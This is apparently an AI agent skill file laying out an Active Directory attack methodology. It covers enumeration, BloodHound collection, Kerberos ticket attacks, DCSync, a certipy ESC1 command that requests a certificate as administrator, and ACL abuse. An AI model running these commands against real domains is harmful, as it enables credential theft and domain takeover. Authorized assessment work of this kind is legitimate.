---
name: active-directory
description: Active Directory security assessment methodology. Covers AD reconnaissance, Kerberos attacks (AS-REP roast, Kerberoast, Golden/Silver Ticket), NTLM relay, SMB relay, ACL abuse (AdminSDHolder, RBCD), domain trust attacks, DCSync, ADCS certificate service abuse (ESC1-ESC13), and BloodHound analysis. Use when you have a foothold on a Windows domain-joined system for AD privilege escalation assessment.
---

# Active Directory Attack Methodology

## Phase 0: Foothold Assessment

- [ ] Domain credentials (user:password)
- [ ] Local admin on workstation
- [ ] Shell on domain-joined server
- [ ] No credentials — anonymous recon only

## Phase 1: Domain Enumeration

```powershell
# Domain info
Get-ADDomain | fl Name,DNSRoot,DistinguishedName
Get-ADDomainController | fl Name,IPv4Address

# Users & groups
Get-ADUser -Filter * | select SamAccountName,Enabled
Get-ADGroup "Domain Admins" | Get-ADGroupMember

# Trusts
Get-ADTrust -Filter *
```

### Without PowerShell:

```cmd
net group "Domain Admins" /domain
nltest /domain_trusts
echo %USERDOMAIN%
```

## Phase 2: BloodHound Collection

```bash
# Windows (SharpHound)
Sharphound.exe --CollectionMethods All --Domain domain.com

# Linux (Python bloodhound)
bloodhound-python -u user -p password -d domain.com -ns DC_IP -c All

# Ingest to BloodHound GUI → find paths to DA
```

## Phase 3: Kerberos Attacks

| Attack | Requirement | Tool | Hashcat Mode |
|--------|------------|------|-------------|
| AS-REP Roast | User without pre-auth required | `impacket-GetNPUsers` | 18200 |
| Kerberoast | Any domain user | `impacket-GetUserSPNs` | 13100 |
| Golden Ticket | KRBTGT hash | `impacket-ticketer` | N/A |
| Silver Ticket | Service account hash | `impacket-ticketer` | N/A |
| DCSync | DA or Replicate rights | `impacket-secretsdump` | N/A |

## Phase 4: ADCS Abuse (ESC1-ESC13)

```bash
# Find vulnerable templates
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable

# ESC1: Template allows SAN (enroll as admin)
certipy req -u user@domain.com -p password -ca CA-SERVER \
  -template VulnTemplate -target DC_IP -upn administrator@domain.com
```

## Phase 5: ACL Abuse

Dangerous rights to look for in BloodHound:

| Right | What it Allows |
|-------|---------------|
| ForceChangePassword | Reset user's password without current |
| AddMember | Add user to privileged group |
| GenericAll | Full control over object |
| WriteOwner | Change object owner |
| WriteDACL | Modify object's ACL |
| AllExtendedRights | Most dangerous extended rights |
